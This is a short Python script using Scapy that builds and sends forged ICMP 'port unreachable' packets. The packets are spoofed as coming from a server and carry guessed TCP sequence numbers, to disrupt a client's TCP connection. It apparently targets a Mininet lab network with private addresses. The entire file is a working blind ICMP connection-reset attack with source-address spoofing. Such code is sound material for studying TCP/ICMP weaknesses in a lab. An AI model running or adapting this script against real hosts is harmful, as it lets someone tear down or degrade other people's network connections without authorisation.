#!/usr/bin/env python3
import time
from scapy.all import IP, ICMP, TCP, send, conf

from pathlib import Path
import sys
sys.path.append(str(Path(__file__).resolve().parent.parent))
from colored_text import * 

CLIENT_IP = "10.0.1.1"
SERVER_IP = "10.0.2.1"

CLIENT_PORT = 40000
SERVER_PORT = 5201

ASSUMED_WINDOW = 2_600_000

SEQ_SPACE = 2 ** 32
num_guesses = 10


print(yellow("⦿ Attack configuration:"))
print("    Client   :", CLIENT_IP)
print("    Server   :", SERVER_IP)
print("    Client port:", CLIENT_PORT)
print("    Server port:", SERVER_PORT)

route = conf.route.route(CLIENT_IP)

print(yellow("⦿ Route to client:"))
print("    interface:", route[0])
print("    gateway  :", route[2])
print("    source   :", route[1])

if route[0] == "lo":
    raise RuntimeError(
        "Scapy is routing the attack toward loopback. "
        "Check the Mininet attacker namespace/network."
    )

packets = []

for i in range(num_guesses):

    seq = (i * ASSUMED_WINDOW) % SEQ_SPACE

    offending = (
        IP(
            src=CLIENT_IP,
            dst=SERVER_IP,
            proto=6 # has TCP payload 
        )
        /
        TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            seq=seq
        )
    )

    forged_icmp = (
        IP(
            src=SERVER_IP,
            dst=CLIENT_IP
        )
        /
        ICMP(
            type=3, # Type 3: Destination Unreachable
            code=3  # Code 3: Port Unreachable
        )
        /
        offending
    )

    packets.append(forged_icmp)




print(
    pink("⦿ Sending %d forged ICMP packets" % len(packets))
)

t0 = time.time()

send(
    packets,
    verbose=False
)

elapsed = time.time() - t0

print(
    cyan("⦿ Sent %d packets in %.2f seconds."
    % (len(packets), elapsed))
)
